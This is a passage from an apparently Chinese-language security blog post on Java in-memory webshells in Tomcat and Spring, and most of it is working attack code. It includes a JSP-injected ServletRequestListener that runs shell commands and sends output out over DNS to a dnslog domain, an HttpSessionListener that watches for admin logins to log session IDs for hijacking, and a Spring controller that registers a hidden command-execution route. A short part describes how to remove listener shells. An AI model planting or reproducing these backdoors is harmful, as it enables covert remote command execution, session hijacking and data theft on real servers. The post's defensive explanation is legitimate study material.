<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> scanner.hasNext() ? scanner.next().trim() : <span class="hljs-string">&quot;null&quot;</span>;<br><br>                        <span class="hljs-comment">// 清理输出：只取第一行、移除换行、限制长度</span><br>                        <span class="hljs-keyword">if</span> (output.contains(<span class="hljs-string">&quot;\n&quot;</span>)) &#123;<br>                            output = output.split(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">0</span>];<br>                        &#125;<br>                        output = output.replaceAll(<span class="hljs-string">&quot;[^a-zA-Z0-9._-]&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>); <span class="hljs-comment">// 保留 DNS 合法字符</span><br>                        <span class="hljs-keyword">if</span> (output.length() &gt; <span class="hljs-number">50</span>) &#123;<br>                            output = output.substring(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>);<br>                        &#125;<br><br>                        <span class="hljs-comment">// Base64 可选，但直接用 clean 字符更可靠（避免 = / +）</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">subdomain</span> <span class="hljs-operator">=</span> output + <span class="hljs-string">&quot;.&quot;</span> + System.currentTimeMillis() / <span class="hljs-number">1000</span>;<br><br>                        <span class="hljs-comment">// 发起 DNS 查询（触发 dnslog 记录）</span><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            InetAddress.getByName(subdomain + <span class="hljs-string">&quot;.&quot;</span> + DNSLOG_DOMAIN);<br>                        &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>                            <span class="hljs-comment">// 即使 DNS 失败也不影响主逻辑</span><br>                        &#125;<br><br>                        System.out.println(<span class="hljs-string">&quot;[DNSLog] Triggered: &quot;</span> + subdomain + <span class="hljs-string">&quot;.&quot;</span> + DNSLOG_DOMAIN);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    <span class="hljs-comment">// 静默失败，避免暴露</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;&#125;<br>        &#125;;<br><br>        <span class="hljs-comment">// 注入 Listener</span><br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> request.getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appCtxField</span> <span class="hljs-operator">=</span> ctx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appCtxField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">appCtx</span> <span class="hljs-operator">=</span> (ApplicationContext) appCtxField.get(ctx);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdCtxField</span> <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdCtxField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">stdCtx</span> <span class="hljs-operator">=</span> (StandardContext) stdCtxField.get(appCtx);<br><br>        stdCtx.addApplicationEventListener(srl);<br><br>%&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758887344659-c1e7701f-6f08-4c9c-a10d-4a0ab34534cf.png" srcset="/img/loading.gif" lazyload></p>
<p>ServletRequestListener会监听所有url，包括404，可以通过特殊header，或者特殊路径、伪装静态资源来提高隐蔽性，减少对业务的影响。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 1. 快速判断：只处理特定参数，避免每次解析</span><br>        <span class="hljs-keyword">if</span> (!(sre.getServletRequest() <span class="hljs-keyword">instanceof</span> HttpServletRequest)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        <br>        <span class="hljs-comment">// 2. 只处理带特定参数 or 特定 User-Agent 的请求（降低触发率）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;User-Agent&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || !ua.contains(<span class="hljs-string">&quot;Mozilla/5.0 (Evil)&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 正常流量直接跳过</span><br>        &#125;<br><br>        <span class="hljs-comment">// 3. 超时控制 + 异步执行（可选）</span><br>        <span class="hljs-comment">// （但异步可能丢失上下文，一般不推荐）</span><br><br>        <span class="hljs-comment">// 4. 执行命令（带超时）</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;);<br>        p.waitFor(<span class="hljs-number">3</span>, java.util.concurrent.TimeUnit.SECONDS); <span class="hljs-comment">// 3秒超时</span><br><br>        <span class="hljs-comment">// 5. 外带结果（DNS/HTTP）</span><br>        <span class="hljs-comment">// ...</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 6. 静默失败！绝不抛异常！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="HttpSessionListener"><a href="#HttpSessionListener" class="headerlink" title="HttpSessionListener"></a><strong>HttpSessionListener</strong></h5><blockquote>
<p>不适合命令执行类内存马，可用于监控管理员登录（利用权限来执行敏感操作，获取数据）</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;<br>&lt;%<br><span class="hljs-keyword">if</span> (application.getAttribute(<span class="hljs-string">&quot;admin_monitor_installed&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>    out.println(<span class="hljs-string">&quot;Admin monitor already active.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 定义恶意 HttpSessionListener</span><br>    <span class="hljs-type">HttpSessionListener</span> <span class="hljs-variable">monitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpSessionListener</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionCreated</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>            <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> se.getSession();<br>            <span class="hljs-comment">// 启动一个异步检查线程（避免阻塞请求）</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 等待最多 10 秒，看是否有管理员身份写入</span><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>                        Thread.sleep(<span class="hljs-number">500</span>); <span class="hljs-comment">// 每 0.5 秒检查一次</span><br><br>                        <span class="hljs-comment">// 检查常见管理员标识字段</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">role</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;role&quot;</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">isAdmin</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;isAdmin&quot;</span>);<br><br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">isAdminUser</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>                        <span class="hljs-keyword">if</span> (role != <span class="hljs-literal">null</span> &amp;&amp; (role.toString().toLowerCase().contains(<span class="hljs-string">&quot;admin&quot;</span>) || <span class="hljs-string">&quot;1&quot;</span>.equals(role.toString()))) &#123;<br>                            isAdminUser = <span class="hljs-literal">true</span>;<br>                            info = <span class="hljs-string">&quot;role=&quot;</span> + role;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; username.toString().equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>                            isAdminUser = <span class="hljs-literal">true</span>;<br>                            info = <span class="hljs-string">&quot;username=&quot;</span> + username;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span> &amp;&amp; user.toString().toLowerCase().contains(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>                            isAdminUser = <span class="hljs-literal">true</span>;<br>                            info = <span class="hljs-string">&quot;user=&quot;</span> + user;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isAdmin != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-string">&quot;true&quot;</span>.equals(isAdmin.toString())) &#123;<br>                            isAdminUser = <span class="hljs-literal">true</span>;<br>                            info = <span class="hljs-string">&quot;isAdmin=true&quot;</span>;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (isAdminUser) &#123;<br>                            <span class="hljs-comment">// 🚨 检测到管理员登录！执行敏感操作</span><br>                            System.err.println(<span class="hljs-string">&quot;[+] Admin login detected! &quot;</span> + info + <span class="hljs-string">&quot;, SessionID: &quot;</span> + session.getId());<br><br>                            <span class="hljs-comment">// 示例1：记录 Session ID（可用于会话劫持）</span><br>                            logToFile(<span class="hljs-string">&quot;Admin Session Hijack&quot;</span>, <span class="hljs-string">&quot;SessionID: &quot;</span> + session.getId() + <span class="hljs-string">&quot;, Info: &quot;</span> + info);<br><br>                            <span class="hljs-comment">// 示例2：执行敏感操作（如读取数据库、写 WebShell）</span><br>                            <span class="hljs-comment">// 这里模拟：读取 WEB-INF/web.xml 内容</span><br>                            <span class="hljs-keyword">try</span> &#123;<br>                                <span class="hljs-type">ServletContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> session.getServletContext();<br>                                <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> ctx.getResourceAsStream(<span class="hljs-string">&quot;/WEB-INF/web.xml&quot;</span>);<br>                                <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                                    <span class="hljs-type">StringWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>                                    IOUtils.copy(is, writer, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                                    logToFile(<span class="hljs-string">&quot;web.xml content&quot;</span>, writer.toString());<br>                                    is.close();<br>                                &#125;<br>                            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                            <span class="hljs-comment">// 示例3：主动创建一个隐蔽的 WebShell（可选）</span><br>                            <span class="hljs-comment">// （此处省略，避免重复之前代码）</span><br><br>                            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 找到即退出</span><br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;).start();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionDestroyed</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>            <span class="hljs-comment">// 可选：记录登出事件</span><br>        &#125;<br><br>        <span class="hljs-comment">// 辅助方法：写日志到临时文件（或回传到攻击者服务器）</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logToFile</span><span class="hljs-params">(String title, String content)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.io.tmpdir&quot;</span>) + <span class="hljs-string">&quot;/admin_monitor_&quot;</span> + System.currentTimeMillis() + <span class="hljs-string">&quot;.log&quot;</span>;<br>                <span class="hljs-keyword">try</span> (<span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(path)) &#123;<br>                    fw.write(<span class="hljs-string">&quot;=== &quot;</span> + title + <span class="hljs-string">&quot; ===\n&quot;</span>);<br>                    fw.write(content);<br>                &#125;<br>                System.err.println(<span class="hljs-string">&quot;[*] Log saved to: &quot;</span> + path);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-comment">// 工具类：用于复制 InputStream（避免依赖 Apache Commons）</span><br>    %&gt;<br>    &lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IOUtils</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copy</span><span class="hljs-params">(InputStream input, Writer output, String encoding)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, encoding);<br>            <span class="hljs-type">char</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span> ((n = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                output.write(buffer, <span class="hljs-number">0</span>, n);<br>            &#125;<br>        &#125;<br>    &#125;<br>    %&gt;<br>    &lt;%<br>    <span class="hljs-comment">// 注册 Listener</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctxField</span> <span class="hljs-operator">=</span> sc.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctxField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> appctxField.get(sc);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctxField</span> <span class="hljs-operator">=</span> appctx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctxField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> stdctxField.get(appctx);<br><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">addListener</span> <span class="hljs-operator">=</span> stdctx.getClass().getDeclaredMethod(<span class="hljs-string">&quot;addApplicationEventListener&quot;</span>, Object.class);<br>    addListener.setAccessible(<span class="hljs-literal">true</span>);<br>    addListener.invoke(stdctx, monitor);<br><br>    application.setAttribute(<span class="hljs-string">&quot;admin_monitor_installed&quot;</span>, <span class="hljs-literal">true</span>);<br>    out.println(<span class="hljs-string">&quot;✅ Admin login monitor installed. Waiting for privileged user...&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(out));<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h4 id="listener内存马销毁"><a href="#listener内存马销毁" class="headerlink" title="listener内存马销毁"></a>listener内存马销毁</h4><p>前面说到销毁内存马的本质是破坏挂载点。</p>
<p>在 Tomcat 中，所有动态注册的 Listener（包括 <code>ServletContextListener</code>、<code>HttpSessionListener</code>、<code>ServletRequestListener</code> 等）都会被存储在：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardContext.applicationEventListenersList<br></code></pre></td></tr></table></figure>

<p>到该数组删除对应的listener</p>
<p>重新部署war</p>
<p>或者重启tomcat</p>
<p><img src="/mdimg/javamemshell1/1757939507574-2fdc9d0b-d9cd-442e-bb7d-af23976e74ff.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Spring类"><a href="#Spring类" class="headerlink" title="Spring类"></a>Spring类</h2><h3 id="Spring-Controller-内存马"><a href="#Spring-Controller-内存马" class="headerlink" title="Spring Controller 内存马"></a>Spring Controller 内存马</h3><ul>
<li><strong>挂载点：</strong>Spring MVC<code>Controller</code>(通过<code>RequestMappingHandlerMapping</code>)。</li>
<li><strong>原理：</strong>对于 Spring MVC 应用，攻击者通过反射操作 Spring 框架的核心组件<code>RequestMappingHandlerMapping</code>，动态注册一个恶意<code>Controller</code>Bean。这使得攻击者可以为恶意功能注册一个全新的 URL 路由，使其看起来就像应用中合法的接口。</li>
<li><strong>企业级危害：高度针对 Spring 应用</strong>，能够无缝融入 Spring 路由体系，创建隐蔽的后门 API 接口，实现远程命令执行、WebShell 等功能，难以通过传统代码审计发现。</li>
</ul>
<h4 id="内存马利用"><a href="#内存马利用" class="headerlink" title="内存马利用"></a>内存马利用</h4><p>Spring MVC 的请求处理依赖于 <code>RequestMappingHandlerMapping</code>（处理 <code>@RequestMapping</code>、<code>@GetMapping</code> 等注解的 Controller），它维护了一个 <strong>URL 路径 → Controller 方法</strong> 的映射表（<code>handlerMethods</code>）。</p>
<blockquote>
<p><strong>Spring Boot 2.x（使用 javax.servlet）</strong><br><strong>Spring Boot 3.x（使用 jakarta.servlet）</strong></p>
</blockquote>
<p>Spring Boot 2.x</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMemshellController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;<br><br><br>    <span class="hljs-meta">@GetMapping(&quot;/makememshell&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">inject</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取 RequestMappingHandlerMapping</span><br>            org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span><br>                    applicationContext.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br><br>            <span class="hljs-comment">// 创建恶意 Controller（匿名对象）</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">evilController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                    resp.setContentType(<span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;X-Cmd&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.isEmpty()) &#123;<br>                        out.println(<span class="hljs-string">&quot;Usage: curl -H &#x27;X-Cmd: aWQ=&#x27; http://target/memshell&quot;</span>);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">decoded</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(cmd));<br>                    Process p;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c &quot;</span> + decoded);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        p = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, decoded&#125;);<br>                    &#125;<br>                    java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    s.close();<br>                    out.println(output);<br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> evilController.getClass().getDeclaredMethod(<span class="hljs-string">&quot;handle&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);<br>            org.springframework.web.servlet.mvc.method.<span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span><br>                    org.springframework.web.servlet.mvc.method.RequestMappingInfo<br>                            .paths(<span class="hljs-string">&quot;/memshell&quot;</span>)<br>                            